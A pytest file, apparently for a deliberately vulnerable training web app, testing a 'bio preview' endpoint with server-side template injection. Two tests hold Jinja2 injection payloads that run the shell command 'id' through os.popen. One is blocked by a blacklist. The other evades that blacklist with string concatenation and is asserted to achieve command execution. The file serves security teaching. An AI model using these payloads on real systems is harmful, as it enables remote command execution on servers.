def test_bio_preview_renders_legitimate_bio(client):
    response = client.post(
        "/a03/bio-preview",
        data={"bio_template": "Just a regular person who likes hiking."},
    )
    assert response.status_code == 200
    assert b"Just a regular person who likes hiking." in response.data


def test_bio_preview_detect_probe_evaluates_expression(client):
    response = client.post("/a03/bio-preview", data={"bio_template": "{{ 7*7 }}"})
    assert response.status_code == 200
    assert b"49" in response.data


def test_bio_preview_blacklist_blocks_naive_payload(client):
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    response = client.post("/a03/bio-preview", data={"bio_template": payload})
    assert response.status_code == 200
    assert b"uid=" not in response.data
    assert b"Blocked" in response.data


def test_bio_preview_blacklist_bypass_achieves_real_command_execution(client):
    payload = (
        "{{ self.__init__.__globals__.__builtins__['__imp'~'ort__']"
        "('o'~'s').__dict__['pop'~'en']('id').read() }}"
    )
    response = client.post("/a03/bio-preview", data={"bio_template": payload})
    assert response.status_code == 200
    assert b"uid=" in response.data


def test_bio_preview_static_teaching_text_shows_literal_braces_not_evaluated(client):
    response = client.get("/a03/bio-preview")
    assert response.status_code == 200
    body = response.data.decode()
    assert "{{ 7*7 }}" in body
    assert "49" not in body


def test_bio_preview_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/bio-preview", data={"bio_template": "Just a regular person."}
    )
    assert response.status_code == 200
    assert b"Just a regular person." in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_bio_preview_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Blacklist Bypass" in response.data
    assert b'href="/a03/bio-preview"' in response.data
